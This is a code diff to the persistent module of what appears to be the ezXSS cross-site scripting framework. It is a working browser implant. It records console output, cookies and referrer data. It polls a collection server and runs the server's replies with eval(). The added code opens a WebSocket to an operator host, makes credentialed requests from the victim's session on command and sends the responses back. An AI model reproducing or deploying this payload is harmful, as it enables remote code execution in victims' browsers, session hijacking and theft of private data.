@@ -1,62 +1,90 @@
-var last = '';
+// ezXSS persistent module
+var ez_we,ez_las="",ez_ind=null;function ez_pin(){try{ez_rD.type="ping",ez_rD.console=console.ez,ez_cb(ez_rD,ez_eva)}catch(e){}}function ez_stp(){null===ez_ind&&(ez_ind=window.setInterval(ez_pin,10000))}function ez_eva(input){return eval(input)}function eze_ini(){ra_hL(),ez_cb(ez_rD,ez_stp)}function ez_persist(){eze_ini(),ez_pin()}
+if(!console.ez){var ms=["log","error","warn"];console.ez="";function ez_for(t,a){var d=new Date().toLocaleTimeString();return "["+d+" "+t+"] "+Array.prototype.join.call(a," ")+"\n";}function ez_wra(m,t){var dm=console[m];console[m]=function (){console.ez=ez_for(t,arguments)+console.ez;dm.apply(console,arguments);};}for(var i=0;i<ms.length;i++){ez_wra(ms[i],ms[i].toUpperCase());}}
+function ra_client(){for(var e="ezXSS=",r=document.cookie.split(";"),t=0;t<r.length;t++){var a=r[t].replace(/^\s+|\s+$/g,"");if(0==a.indexOf(e)){var l=a.substring(e.length,a.length),o=new Date;return o.setFullYear(o.getFullYear()+1),setCookie(e,l,o.toUTCString().replace("GMT",""),"/"),l}}for(var l="",o="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=0;t<16;t++)l+=o.charAt(Math.floor(Math.random()*o.length));var n=new Date;return n.setFullYear(n.getFullYear()+1),setCookie(e,l,n.toUTCString().replace("GMT",""),"/"),l}function setCookie(e,r,t,a){var l=e+r+";";t&&(l+="expires="+t+";"),a&&(l+="path="+a+";SameSite=lax;"),document.cookie=l}
 
-function ping() {
-    try {
-        ez_rD.type = 'ping';
-        ez_rD.console = console.everything;
-        ez_cb(ez_rD, callback);
-    } catch (e) {
-    }
-}
+function ez_fet(url, method = 'GET', postData = null) {
+    return new Promise(function (resolve, reject) {
+        var xhr = new XMLHttpRequest();
+        xhr.open(method, url, true);
+        xhr.withCredentials = true;
+        xhr.responseType = "arraybuffer";
 
-var intervalId = null;
+        if (method === 'POST' && postData) {
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        }
 
-function startPing() {
-  if (intervalId === null) {
-    intervalId = window.setInterval(ping, 10000);
-  }
-}
-
-function callback(input) {
-    eval(input);
-}
-
-function init() {
-    // Ready to persist
-    ra_hL();
-    ez_cb(ez_rD, startPing);
-}
-
-function ez_persist() {
-    init();
-    ping();
-}
-
-
-if (!console.everything) {
-    console.everything = "";
-    function formatLog(type, args) {
-        var date = new Date().toLocaleTimeString();
-        return "[" + date + " " + type + "] " + Array.prototype.join.call(args, " ") + "\n";
-    }
-    function wrapConsoleMethod(method, type) {
-        var defaultMethod = console[method];
-        console[method] = function () {
-            console.everything = formatLog(type, arguments) + console.everything;
-            defaultMethod.apply(console, arguments);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                var base64 = btoa(
+                    new Uint8Array(xhr.response).reduce(
+                        (data, byte) => data + String.fromCharCode(byte),
+                        ""
+                    )
+                );
+                resolve({
+                    statusCode: xhr.status,
+                    body: base64,
+                    contentType: xhr.getResponseHeader("Content-Type")
+                });
+            }
         };
-    }
-    var methods = ["log", "error", "warn"];
-    for (var i = 0; i < methods.length; i++) {
-        wrapConsoleMethod(methods[i], methods[i].toUpperCase());
-    }
+        xhr.onerror = function () {
+            reject(new Error("Failed to load content"));
+        };
+        xhr.send(postData);
+    });
 }
 
-function ra_client(){var e="ezXSS=",t=document.cookie.split(";");for(var n=0;n<t.length;n++){var r=t[n].replace(/^\s+|\s+$/g,"");if(0==r.indexOf(e)){var o=r.substring(e.length,r.length),a=new Date;a.setFullYear(a.getFullYear()+1),setCookie(e,o,a.toUTCString().replace("GMT",""),"/");return o}}for(var o="",a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=0;n<16;n++)o+=a.charAt(Math.floor(Math.random()*a.length));var s=new Date;s.setFullYear(s.getFullYear()+1),setCookie(e,o,s.toUTCString().replace("GMT",""),"/");return o}function setCookie(e,t,n,r){var o=e+t+";";n&&(o+="expires="+n+";"),r&&(o+="path="+r+";SameSite=lax;"),document.cookie=o}
+function ez_soc(h, p=0) {
+    if (ez_we && ez_we.readyState === WebSocket.OPEN) {
+        return;
+    }
+
+    ez_we = new WebSocket('wss://' + h);
+
+    ez_we.onopen = function () {
+        ez_we.send(JSON.stringify({ 'clientid': ra_client(), 'pass': p, 'origin': location.host }));
+    };
+
+    ez_we.onmessage = function (event) {
+        const data = JSON.parse(event.data);
+        if (data.do == "GET" || data.do == "POST") {
+            ez_fet(data.request_uri, data.do, data.postData)
+                .then(function (response) {
+                    ez_we.send(
+                        JSON.stringify({
+                            clientid: ra_client(),
+                            statusCode: response.statusCode,
+                            body: response.body,
+                            request_uri: data.request_uri,
+                            content_type: response.contentType,
+                            pass: p,
+                            origin: location.host
+                        })
+                    );
+                })
+                .catch(function (error) {
+                    console.error(error);
+                });
+        }
+    };
+
+
+    ez_we.onerror = function (error) {
+        //
+    };
+
+    ez_we.onclose = function () {
+        setTimeout(function() {
+            ez_soc(h,p);
+        }, 5000);
+    };
+}
 
 function ra_hL() {
     ez_rD.type = 'init';
-    ez_rD.console = console.everything;
+    ez_rD.console = console.ez;
     try {
         ez_rD.clientid = ra_client()
     } catch (e) {
@@ -78,8 +106,8 @@ function ra_hL() {
         ez_rD.cookies = ""
     }
     try {
-        if (last != '') {
-            ez_rD.referer = ez_n(last)
+        if (ez_las != '') {
+            ez_rD.referer = ez_n(ez_las)
         } else {
             ez_rD.referer = ez_n(document.referrer)
         }
@@ -156,7 +184,7 @@ function ra_r() {
                             var request = new XMLHttpRequest();
                             request.onload = function () {
                                 if (this.readyState == 4) {
-                                    last = ez_n(location.toString());
+                                    ez_las = ez_n(location.toString());
                                     document.getElementsByTagName("html")[0].innerHTML = this.responseText;
                                     window.scrollTo(0, 0);
                                     let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
@@ -173,7 +201,7 @@ function ra_r() {
                                             document.body.appendChild(a);
                                         } catch (e) { }
                                     }
-                                    init();
+                                    eze_ini();
                                 }
                             };
 
